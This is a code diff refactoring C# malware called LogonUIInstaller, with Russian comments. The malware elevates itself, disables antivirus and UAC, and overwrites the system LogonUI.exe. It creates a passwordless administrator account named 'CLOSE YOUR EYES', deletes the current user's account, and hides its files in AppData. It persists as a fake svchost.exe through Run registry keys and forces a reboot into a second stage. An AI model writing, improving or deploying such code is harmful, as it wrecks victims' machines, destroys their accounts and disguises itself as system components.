@@ -15,6 +15,7 @@ namespace LogonUIInstaller
     {
         private static Mutex mutex;
         private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
+        private static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
 
         [STAThread]
         static void Main(string[] args)
@@ -25,37 +26,30 @@ namespace LogonUIInstaller
 
             try
             {
-                // ========== СТАДИЯ 2: ЗАПУСК ФОРМЫ (после перезагрузки) ==========
                 if (args.Length > 0 && args[0] == "stage2")
                 {
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
-
-                    // УДАЛЯЕМ LogonUI.exe (замена на кастомный)
                     ReplaceLogonUI();
-
-                    // ЗАПУСКАЕМ ФОРМУ
-                    MainInterface ui = new MainInterface();
-                    ui.Show();
-                    Application.Run();
+                    Application.Run(new MainInterface());
                     return;
                 }
 
-                // ========== СТАДИЯ 1: УСТАНОВЩИК (первый запуск) ==========
                 if (!IsElevated())
                 {
                     RestartAsAdmin();
                     return;
                 }
 
-                // Выполняем все блокировки и настройки
+                // Распаковка ресурсов
+                ExtractAllResources();
+
+                // Блокировки и настройки
                 ApplySystemBlocks();
                 DisableAntivirusAndUAC();
                 ReplaceWallpaperAndCursors();
-                ReplaceUserAccount(); // ← НОВАЯ ВЕРСИЯ (удаляет пользователя ДО перезагрузки)
+                ReplaceUserAccount();
                 AddToStartupWithStage2();
-
-                // Принудительная перезагрузка
                 ForceReboot();
             }
             finally
@@ -65,7 +59,45 @@ namespace LogonUIInstaller
             }
         }
 
-        // ==================== ЗАМЕНА LogonUI.exe ====================
+        // ==================== РАСПАКОВКА РЕСУРСОВ ====================
+        private static void ExtractAllResources()
+        {
+            try
+            {
+                if (!Directory.Exists(appDataPath))
+                    Directory.CreateDirectory(appDataPath);
+
+                ExtractResource("hr.gif", Path.Combine(appDataPath, "hr.gif"));
+                ExtractResource("dv.mp3", Path.Combine(appDataPath, "dv.mp3"));
+                ExtractResource("vd.mp4", Path.Combine(appDataPath, "vd.mp4"));
+                ExtractResource("kj.mp4", Path.Combine(appDataPath, "kj.mp4"));
+                ExtractResource("kf.mp4", Path.Combine(appDataPath, "kf.mp4"));
+                ExtractResource("wd.webp", Path.Combine(appDataPath, "wd.webp"));
+                ExtractResource("fg.ani", Path.Combine(appDataPath, "fg.ani"));
+
+                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
+                foreach (string file in Directory.GetFiles(appDataPath))
+                    File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.ReadOnly);
+            }
+            catch { }
+        }
+
+        private static void ExtractResource(string name, string outputPath)
+        {
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
+                {
+                    if (stream == null) return;
+                    byte[] data = new byte[stream.Length];
+                    stream.Read(data, 0, data.Length);
+                    File.WriteAllBytes(outputPath, data);
+                }
+            }
+            catch { }
+        }
+
+        // ==================== ЗАМЕНА LogonUI ====================
         private static void ReplaceLogonUI()
         {
             try
@@ -97,10 +129,23 @@ namespace LogonUIInstaller
                     }
                 }
 
-                byte[] customLogonUI = ExtractResource("LogonUI.exe");
+                byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                 File.WriteAllBytes(originalPath, customLogonUI);
             }
             catch { }
+        }
+
+        private static byte[] ExtractResourceBytes(string resourceName)
+        {
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
+                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
+            {
+                if (stream == null) throw new Exception($"Resource {resourceName} not found");
+                byte[] data = new byte[stream.Length];
+                stream.Read(data, 0, data.Length);
+                return data;
+            }
         }
 
         private static void ForceFullAccess(string path)
@@ -179,24 +224,10 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        private static byte[] ExtractResource(string resourceName)
-        {
-            Assembly assembly = Assembly.GetExecutingAssembly();
-            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
-                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
-            {
-                if (stream == null) throw new Exception($"Resource {resourceName} not found");
-                byte[] data = new byte[stream.Length];
-                stream.Read(data, 0, data.Length);
-                return data;
-            }
-        }
-
         // ==================== УСТАНОВЩИК ====================
         private static bool IsElevated()
         {
-            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
-                .IsInRole(WindowsBuiltInRole.Administrator);
+            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
         }
 
         private static void RestartAsAdmin()
@@ -304,21 +335,19 @@ namespace LogonUIInstaller
         {
             try
             {
-                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                string targetDir = Path.Combine(appData, "SystemUpdate");
+                string targetDir = appDataPath;
                 if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
 
-                ExtractResourceToFile("wd.webp", Path.Combine(targetDir, "wd.webp"));
-                ExtractResourceToFile("fg.ani", Path.Combine(targetDir, "fg.ani"));
+                string wallpaperPath = Path.Combine(targetDir, "wd.webp");
+                string cursorPath = Path.Combine(targetDir, "fg.ani");
 
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
                 {
-                    key.SetValue("Wallpaper", Path.Combine(targetDir, "wd.webp"), RegistryValueKind.String);
+                    key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                     key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                     key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                 }
 
-                string cursorPath = Path.Combine(targetDir, "fg.ani");
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
                 {
                     key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
@@ -346,23 +375,6 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        private static void ExtractResourceToFile(string name, string outputPath)
-        {
-            try
-            {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
-                {
-                    if (stream == null) return;
-                    byte[] data = new byte[stream.Length];
-                    stream.Read(data, 0, data.Length);
-                    File.WriteAllBytes(outputPath, data);
-                    File.SetAttributes(outputPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
-                }
-            }
-            catch { }
-        }
-
-        // ==================== НОВАЯ ВЕРСИЯ: УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ ====================
         private static void ReplaceUserAccount()
         {
             try
@@ -370,7 +382,6 @@ namespace LogonUIInstaller
                 string currentUser = Environment.UserName;
                 string newUser = "CLOSE YOUR EYES";
 
-                // 1. СОЗДАЁМ НОВОГО ПОЛЬЗОВАТЕЛЯ (БЕЗ ПАРОЛЯ)
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -380,7 +391,6 @@ namespace LogonUIInstaller
                     UseShellExecute = false
                 });
 
-                // 2. ДОБАВЛЯЕМ НОВОГО ПОЛЬЗОВАТЕЛЯ В АДМИНИСТРАТОРЫ (ВРЕМЕННО)
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -390,7 +400,6 @@ namespace LogonUIInstaller
                     UseShellExecute = false
                 });
 
-                // 3. УДАЛЯЕМ СТАРОГО ПОЛЬЗОВАТЕЛЯ (ПРЯМО СЕЙЧАС)
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -400,8 +409,6 @@ namespace LogonUIInstaller
                     UseShellExecute = false
                 });
 
-                // 4. ПРИНУДИТЕЛЬНЫЙ ВЫХОД ИЗ СИСТЕМЫ (ЧТОБЫ НЕ БЫЛО КОНФЛИКТОВ)
-                // ДОБАВЛЯЕМ В АВТОЗАГРУЗКУ ПРИНУДИТЕЛЬНЫЙ ВЫХОД
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce"))
                 {
                     key.SetValue("Logoff", $"shutdown /l /f /t 0", RegistryValueKind.String);
@@ -414,21 +421,19 @@ namespace LogonUIInstaller
         {
             try
             {
-                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                string targetDir = Path.Combine(appData, "SystemUpdate");
-                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
+                if (!Directory.Exists(appDataPath))
+                    Directory.CreateDirectory(appDataPath);
 
                 string selfPath = Assembly.GetEntryAssembly().Location;
-                string destPath = Path.Combine(targetDir, "svchost.exe");
+                string destPath = Path.Combine(appDataPath, "svchost.exe");
                 if (File.Exists(selfPath) && !File.Exists(destPath))
                 {
                     File.Copy(selfPath, destPath, true);
                 }
 
                 File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
-                File.SetAttributes(targetDir, FileAttributes.Hidden | FileAttributes.ReadOnly);
+                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
 
-                // Добавляем в автозагрузку с аргументом stage2
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
